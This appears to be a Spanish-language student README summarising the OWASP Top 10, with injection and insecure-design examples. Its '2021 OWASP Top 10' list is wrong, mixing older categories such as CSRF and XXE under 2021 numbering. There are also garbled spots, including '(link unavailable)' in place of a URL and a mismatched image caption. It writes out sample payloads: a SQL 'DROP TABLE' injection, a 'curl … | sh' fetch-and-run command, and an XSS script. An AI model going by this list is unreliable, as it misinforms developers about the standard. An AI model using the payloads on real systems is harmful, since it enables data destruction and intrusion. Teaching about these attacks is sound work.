Integrantes

Paola Quiroga
iquirogaped@uniminuto.edu.co PaolaQ-I

Alejandro Cortes
jairo.cortes@uniminuto.edu.co
acortes2

Charles Guerrero
charles.guerrero@uniminuto@uniminuto.edu.co
CharlesGuerrero14

# El OWASP Top 10
Es un documento de concientización estándar para desarrolladores y seguridad de aplicaciones web. Representa un amplio consenso sobre los riesgos de seguridad más críticos para las aplicaciones web.

# 2021 OWASP Top 10
Inyección de código (A01:2021): Vulnerabilidad que permite a un atacante inyectar código malicioso en una aplicación.

Autenticación y autorización débiles (A02:2021): Vulnerabilidades en la autenticación y autorización que permiten accesos no autorizados.

Exposición de datos sensibles (A03:2021): Vulnerabilidades que permiten la exposición de datos sensibles, como contraseñas o información financiera.

XML External Entities (XXE) (A04:2021): Vulnerabilidad que permite a un atacante acceder a datos confidenciales mediante la inyección de entidades XML externas.

Interceptación de solicitudes entre sitios (CSRF) (A05:2021): Vulnerabilidad que permite a un atacante realizar acciones no autorizadas en una aplicación.

Configuración de seguridad inadecuada (A06:2021): Vulnerabilidades debido a una configuración de seguridad inadecuada.

Cross-Site Scripting (XSS) (A07:2021): Vulnerabilidad que permite a un atacante inyectar código JavaScript malicioso en una aplicación.

Deserialización de datos insegura (A08:2021): Vulnerabilidad que permite a un atacante ejecutar código malicioso mediante la deserialización de datos.

Uso de componentes con vulnerabilidades conocidas (A09:2021): Vulnerabilidades debido al uso de componentes con vulnerabilidades conocidas.

Registro y seguimiento de seguridad insuficiente (A10:2021): Vulnerabilidades debido a un registro y seguimiento de seguridad insuficiente.

# Inyección 
La inyección ocurre cuando un atacante puede insertar datos maliciosos en una aplicación, permitiéndole ejecutar código o acceder a información confidencial.

Ejemplos de Inyección:

Inyección SQL: Un atacante ingresa en un formulario de búsqueda el siguiente texto: Robert'); DROP TABLE usuarios; --. Si la aplicación no valida la entrada, puede ejecutar la sentencia SQL y eliminar la tabla de usuarios.

Inyección de comandos: Un atacante ingresa en un formulario de carga de archivos el siguiente texto: curl (link unavailable) | sh. Si la aplicación no valida la entrada, puede ejecutar el comando y descargar malware.

Inyección de código: Un atacante ingresa en un formulario de comentarios el siguiente texto: <script>alert('XSS')</script>. Si la aplicación no valida la entrada, puede ejecutar el código JavaScript y mostrar un mensaje emergente.

![Screenshot of a comment on a GitHub.](https://www.cloudflare.com/learning/security/threats/sql-injection/)


# Diseño Inseguro 
El diseño inseguro se refiere a la falta de consideración de la seguridad en el diseño de una aplicación, lo que puede llevar a vulnerabilidades.

Ejemplos de Diseño Inseguro:

Autenticación débil: Una aplicación utiliza solo el nombre de usuario y contraseña para autenticar, sin utilizar métodos adicionales de verificación como 2FA.

Almacenamiento de contraseñas en texto plano: Una aplicación almacena las contraseñas de los usuarios en texto plano, en lugar de utilizar hashes y sal.

Uso de protocolos inseguros: Una aplicación utiliza protocolos inseguros como HTTP en lugar de HTTPS para la comunicación.

Falta de validación de entrada: Una aplicación no valida la entrada del usuario, permitiendo la inyección de código malicioso.

Uso de bibliotecas y frameworks obsoletos: Una aplicación utiliza bibliotecas y frameworks obsoletos que contienen vulnerabilidades conocidas.

Es importante tener en cuenta que estos son solo ejemplos y que la seguridad de una aplicación depende de muchos factores. Es recomendable consultar la documentación oficial de OWASP para obtener más información detallada.
